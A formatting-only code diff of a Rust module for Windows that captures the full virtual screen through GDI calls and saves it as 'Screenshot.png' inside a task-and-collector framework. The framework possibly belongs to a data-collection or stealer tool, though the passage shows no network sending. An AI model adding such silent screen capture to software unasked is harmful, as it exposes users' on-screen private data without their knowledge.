@@ -4,27 +4,29 @@ use alloc::vec::Vec;
 use core::mem::zeroed;
 use core::ptr::null_mut;
 use miniz_oxide::deflate::compress_to_vec_zlib;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 use utils::path::{Path, WriteToFile};
 
 use collector::Collector;
 use utils::WideString;
-use windows_sys::Win32::Graphics::Gdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject, GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
+use windows_sys::Win32::Graphics::Gdi::{
+    BI_RGB, BITMAPINFO, BITMAPINFOHEADER, BitBlt, CreateCompatibleBitmap, CreateCompatibleDC,
+    CreateDCW, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDIBits, SRCCOPY, SelectObject,
+};
 use windows_sys::Win32::UI::WindowsAndMessaging::{
-    GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN,
-    SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
+    GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
 };
 
 pub(super) struct ScreenshotTask;
 
 impl<C: Collector> Task<C> for ScreenshotTask {
     parent_name!("Screenshot.png");
-    
+
     fn run(&self, parent: &Path, _: &C) {
         let Ok((width, height, pixels)) = capture_screen() else {
-            return
+            return;
         };
-        
+
         let png = create_png(width as u32, height as u32, &pixels);
         let _ = png.write_to(parent);
     }
@@ -32,8 +34,12 @@ impl<C: Collector> Task<C> for ScreenshotTask {
 
 fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
     let (x, y, width, height) = unsafe {
-        (GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN), 
-         GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN))
+        (
+            GetSystemMetrics(SM_XVIRTUALSCREEN),
+            GetSystemMetrics(SM_YVIRTUALSCREEN),
+            GetSystemMetrics(SM_CXVIRTUALSCREEN),
+            GetSystemMetrics(SM_CYVIRTUALSCREEN),
+        )
     };
 
     let hdc = unsafe {
@@ -41,7 +47,7 @@ fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
             "DISPLAY".to_wide().as_ptr(),
             null_mut(),
             null_mut(),
-            null_mut()
+            null_mut(),
         )
     };
 
@@ -73,7 +79,7 @@ fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
             DIB_RGB_COLORS,
         )
     };
-    
+
     unsafe {
         DeleteObject(hbitmap as *mut _);
         DeleteDC(hdc_mem);
